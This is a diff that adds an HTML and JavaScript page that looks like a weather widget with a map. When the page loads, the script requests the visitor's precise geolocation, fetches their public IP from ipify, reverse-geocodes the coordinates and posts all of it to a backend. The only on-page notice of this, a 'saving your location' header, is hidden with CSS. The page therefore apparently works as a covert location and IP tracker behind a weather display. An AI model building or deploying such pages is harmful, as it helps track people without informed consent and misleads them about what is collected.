@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Location Saver</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+    }
+    pre {
+      background: #f4f4f4;
+      padding: 15px;
+      border-radius: 8px;
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+    #mapFrame {
+      width: 100%;
+      max-width: 700px;
+      height: 350px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+    }
+    #dataSection {
+      display: none;
+    }
+    #autoHeader {
+      display: none;
+    }
+
+    /* ── Weather Card ── */
+    .weather-card {
+      max-width: 700px;
+      border-radius: 20px;
+      padding: 32px 28px 24px;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: #fff;
+      box-shadow: 0 10px 40px rgba(102, 126, 234, .35);
+      position: relative;
+      overflow: hidden;
+      margin-bottom: 28px;
+    }
+    .weather-card::before {
+      content: '';
+      position: absolute;
+      top: -60px; right: -60px;
+      width: 220px; height: 220px;
+      background: rgba(255,255,255,.08);
+      border-radius: 50%;
+    }
+    .weather-card::after {
+      content: '';
+      position: absolute;
+      bottom: -40px; left: -40px;
+      width: 160px; height: 160px;
+      background: rgba(255,255,255,.06);
+      border-radius: 50%;
+    }
+    .weather-card .wc-header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 14px;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      opacity: .85;
+      margin-bottom: 18px;
+    }
+    .weather-card .wc-main {
+      display: flex;
+      align-items: center;
+      gap: 18px;
+      margin-bottom: 22px;
+    }
+    .weather-card .wc-icon {
+      font-size: 64px;
+      line-height: 1;
+      filter: drop-shadow(0 4px 12px rgba(0,0,0,.15));
+      animation: float 3s ease-in-out infinite;
+    }
+    @keyframes float {
+      0%,100% { transform: translateY(0); }
+      50%     { transform: translateY(-8px); }
+    }
+    .weather-card .wc-temp {
+      font-size: 56px;
+      font-weight: 700;
+      line-height: 1;
+    }
+    .weather-card .wc-temp span {
+      font-size: 28px;
+      font-weight: 400;
+      vertical-align: super;
+      opacity: .8;
+    }
+    .weather-card .wc-desc {
+      font-size: 20px;
+      font-weight: 500;
+      margin-bottom: 4px;
+    }
+    .weather-card .wc-stats {
+      display: flex;
+      gap: 14px;
+      flex-wrap: wrap;
+      position: relative;
+      z-index: 1;
+    }
+    .weather-card .wc-stat {
+      flex: 1 1 120px;
+      background: rgba(255,255,255,.15);
+      backdrop-filter: blur(6px);
+      border-radius: 12px;
+      padding: 14px 16px;
+      text-align: center;
+      transition: transform .2s, background .2s;
+    }
+    .weather-card .wc-stat:hover {
+      transform: translateY(-3px);
+      background: rgba(255,255,255,.25);
+    }
+    .weather-card .wc-stat .label {
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      opacity: .75;
+      margin-bottom: 6px;
+    }
+    .weather-card .wc-stat .value {
+      font-size: 22px;
+      font-weight: 600;
+    }
+    .weather-card .wc-provider {
+      margin-top: 16px;
+      font-size: 11px;
+      opacity: .5;
+      text-align: right;
+    }
+
+    /* loading shimmer */
+    .weather-card.loading .wc-main,
+    .weather-card.loading .wc-stats {
+      opacity: .4;
+      animation: pulse 1.4s ease-in-out infinite;
+    }
+    @keyframes pulse {
+      0%,100% { opacity:.4; }
+      50%     { opacity:.7; }
+    }
+  </style>
+</head>
+<body>
+
+  <div id="autoHeader">
+    <h2>Auto Save Current Location</h2>
+    <p id="status">Detecting and saving your location...</p>
+  </div>
+
+  <div id="dataSection">
+    <h3>Saved Data (from backend)</h3>
+    <pre id="output">No data yet</pre>
+  </div>
+
+  <div class="weather-card loading" id="weatherCard">
+    <div class="wc-header">☁️ Current Weather</div>
+    <div class="wc-main">
+      <div class="wc-icon" id="wIcon">🌤️</div>
+      <div>
+        <div class="wc-temp" id="wTemp">--<span>°C</span></div>
+        <div class="wc-desc" id="wDesc">Loading...</div>
+      </div>
+    </div>
+    <div class="wc-stats">
+      <div class="wc-stat">
+        <div class="label">💧 Humidity</div>
+        <div class="value" id="wHumidity">--%</div>
+      </div>
+      <div class="wc-stat">
+        <div class="label">💨 Wind</div>
+        <div class="value" id="wWind">-- km/h</div>
+      </div>
+      <div class="wc-stat">
+        <div class="label">🕐 Observed</div>
+        <div class="value" id="wTime">--:--</div>
+      </div>
+    </div>
+    <div class="wc-provider" id="wProvider"></div>
+  </div>
+  <!-- hidden element kept for JS compatibility -->
+  <p id="weather" style="display:none;"></p>
+
+  <h3>Map</h3>
+  <iframe id="mapFrame" title="Location map" loading="lazy"></iframe>
+  <p><a id="mapLink" href="#" target="_blank" rel="noopener noreferrer">Open map in new tab</a></p>
+
+  <script>
+    let savedLocations = [];
+
+    function openMeteoCodeToText(code) {
+      const map = {
+        0: "Clear sky",
+        1: "Mainly clear",
+        2: "Partly cloudy",
+        3: "Overcast",
+        45: "Fog",
+        48: "Rime fog",
+        51: "Light drizzle",
+        53: "Moderate drizzle",
+        55: "Dense drizzle",
+        61: "Slight rain",
+        63: "Moderate rain",
+        65: "Heavy rain",
+        71: "Slight snowfall",
+        73: "Moderate snowfall",
+        75: "Heavy snowfall",
+        80: "Rain showers",
+        95: "Thunderstorm"
+      };
+      return map[code] || "Unknown weather";
+    }
+
+    function updateMap(latitude, longitude) {
+      const delta = 0.01;
+      const left = longitude - delta;
+      const right = longitude + delta;
+      const top = latitude + delta;
+      const bottom = latitude - delta;
+
+      const bbox = `${left},${bottom},${right},${top}`;
+      const mapUrl = `https://www.openstreetmap.org/export/embed.html?bbox=${encodeURIComponent(bbox)}&layer=mapnik&marker=${latitude},${longitude}`;
+      const openMapUrl = `https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}#map=15/${latitude}/${longitude}`;
+
+      document.getElementById("mapFrame").src = mapUrl;
+      document.getElementById("mapLink").href = openMapUrl;
+    }
+
+    function weatherEmoji(code) {
+      if (code === null || code === undefined) return '🌡️';
+      if (code === 0)                  return '☀️';
+      if (code <= 3)                   return '⛅';
+      if (code <= 48)                  return '🌫️';
+      if (code <= 57)                  return '🌦️';
+      if (code <= 67)                  return '🌧️';
+      if (code <= 77)                  return '❄️';
+      if (code <= 82)                  return '🌧️';
+      if (code <= 86)                  return '🌨️';
+      if (code >= 95)                  return '⛈️';
+      return '🌤️';
+    }
+
+    function renderWeather(weatherData) {
+      const card      = document.getElementById('weatherCard');
+      const weatherEl = document.getElementById('weather');
+
+      if (!weatherData) {
+        document.getElementById('wDesc').textContent = 'Weather data unavailable.';
+        card.classList.remove('loading');
+        weatherEl.textContent = 'Weather data unavailable.';
+        return;
+      }
+
+      card.classList.remove('loading');
+
+      document.getElementById('wIcon').textContent     = weatherEmoji(weatherData.weather_code);
+      document.getElementById('wTemp').innerHTML        = `${weatherData.temperature_c ?? '--'}<span>°C</span>`;
+      document.getElementById('wDesc').textContent      = weatherData.description || 'Unknown';
+      document.getElementById('wHumidity').textContent  = `${weatherData.humidity_percent ?? '--'}%`;
+      document.getElementById('wWind').textContent      = `${weatherData.wind_kmh ?? '--'} km/h`;
+
+      if (weatherData.observed_at) {
+        const d = new Date(weatherData.observed_at);
+        document.getElementById('wTime').textContent = d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+      }
+
+      if (weatherData.provider) {
+        document.getElementById('wProvider').textContent = `Powered by ${weatherData.provider}`;
+      }
+
+      weatherEl.textContent = `${weatherData.description} | ${weatherData.temperature_c}°C | Humidity ${weatherData.humidity_percent}% | Wind ${weatherData.wind_kmh} km/h`;
+    }
+
+    async function loadSavedLocations() {
+      try {
+        const res = await fetch("/api/locations");
+        if (!res.ok) {
+          throw new Error("Failed to load saved locations");
+        }
+
+        savedLocations = await res.json();
+        document.getElementById("output").textContent =
+          savedLocations.length ? JSON.stringify(savedLocations, null, 2) : "No data yet";
+
+        if (savedLocations.length) {
+          const last = savedLocations[savedLocations.length - 1];
+          updateMap(last.latitude, last.longitude);
+        }
+      } catch (error) {
+        console.error(error);
+      }
+    }
+
+    async function fetchWeather(latitude, longitude) {
+      const weatherEl = document.getElementById("weather");
+      weatherEl.textContent = "Loading weather...";
+
+      try {
+        const weatherRes = await fetch(`/api/weather?lat=${encodeURIComponent(latitude)}&lon=${encodeURIComponent(longitude)}`);
+
+        if (!weatherRes.ok) {
+          const errorJson = await weatherRes.json().catch(() => ({}));
+          throw new Error(errorJson.error || "Failed backend weather");
+        }
+
+        const weatherData = await weatherRes.json();
+        renderWeather(weatherData);
+        return weatherData;
+      } catch (backendError) {
+        console.error("Backend weather failed, using Open-Meteo fallback:", backendError);
+
+        const fallbackRes = await fetch(
+          `https://api.open-meteo.com/v1/forecast?latitude=${encodeURIComponent(latitude)}&longitude=${encodeURIComponent(longitude)}&current=temperature_2m,relative_humidity_2m,weather_code,wind_speed_10m&timezone=auto`
+        );
+
+        if (!fallbackRes.ok) {
+          throw new Error("Failed to load weather from fallback source.");
+        }
+
+        const fallbackJson = await fallbackRes.json();
+        const current = fallbackJson?.current;
+
+        if (!current) {
+          throw new Error("Fallback weather data unavailable.");
+        }
+
+        const weatherData = {
+          weather_code: current.weather_code ?? null,
+          description: openMeteoCodeToText(current.weather_code),
+          temperature_c: current.temperature_2m ?? null,
+          humidity_percent: current.relative_humidity_2m ?? null,
+          wind_kmh: current.wind_speed_10m ?? null,
+          observed_at: current.time || new Date().toISOString(),
+          provider: "Open-Meteo"
+        };
+
+        renderWeather(weatherData);
+        return weatherData;
+      }
+    }
+
+    async function saveLocation() {
+      const statusEl = document.getElementById("status");
+      const tag = `auto-${new Date().toISOString()}`;
+
+      if (!navigator.geolocation) {
+        statusEl.textContent = "Geolocation is not supported by this browser.";
+        return;
+      }
+
+      statusEl.textContent = "Getting location permission...";
+
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          try {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            statusEl.textContent = "Location found. Saving...";
+
+            // Get public IP
+            const ipRes = await fetch("https://api.ipify.org?format=json");
+            const ipJson = await ipRes.json();
+
+            // Reverse geocoding using OpenStreetMap Nominatim
+            const placeRes = await fetch(
+              `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`
+            );
+            const placeJson = await placeRes.json();
+
+            let weatherData = null;
+            try {
+              weatherData = await fetchWeather(lat, lng);
+            } catch (error) {
+              console.error(error);
+              document.getElementById("weather").textContent = "Failed to load weather.";
+            }
+
+            const locationData = {
+              tag: tag,
+              latitude: lat,
+              longitude: lng,
+              ip: ipJson.ip,
+              place: placeJson.display_name || "Unknown place",
+              timestamp: new Date().toISOString(),
+              weather: weatherData
+            };
+
+            const saveRes = await fetch("/api/save-location", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify(locationData)
+            });
+
+            if (!saveRes.ok) {
+              throw new Error("Failed to save location");
+            }
+
+            const saveJson = await saveRes.json();
+            savedLocations = saveJson.all;
+
+            document.getElementById("output").textContent =
+              JSON.stringify(savedLocations, null, 2);
+
+            updateMap(locationData.latitude, locationData.longitude);
+            statusEl.textContent = "Location saved automatically.";
+          } catch (error) {
+            console.error(error);
+            statusEl.textContent = "Failed to fetch location details or save to backend.";
+          }
+        },
+        (error) => {
+          statusEl.textContent = "Failed to get location: " + error.message;
+          document.getElementById("weather").textContent = "Weather unavailable because location failed.";
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
+      );
+    }
+
+    window.addEventListener("DOMContentLoaded", async () => {
+      await loadSavedLocations();
+
+      if (savedLocations.length) {
+        const last = savedLocations[savedLocations.length - 1];
+        if (last.weather) {
+          renderWeather(last.weather);
+        } else {
+          try {
+            await fetchWeather(last.latitude, last.longitude);
+          } catch (error) {
+            console.error(error);
+            document.getElementById("weather").textContent = "Failed to load weather.";
+          }
+        }
+      }
+
+      await saveLocation();
+    });
+  </script>
+
+</body>
+</html>
